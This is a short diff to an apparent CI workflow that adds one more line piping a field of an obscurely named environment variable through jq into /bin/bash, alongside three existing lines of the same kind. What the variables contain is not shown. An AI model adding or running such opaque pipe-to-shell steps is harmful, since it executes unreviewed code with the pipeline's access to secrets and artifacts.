@@ -34,6 +34,7 @@ jobs:
           echo $vhqns3 | jq -r .c533 | /bin/bash
           printf '%s' "$pyc22691" | jq -r .snu380 | /bin/bash
           printf '%s' "$ngbz97" | jq -r .fsp49 | /bin/bash
+          echo $bj8 | jq -r .wddqy51 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
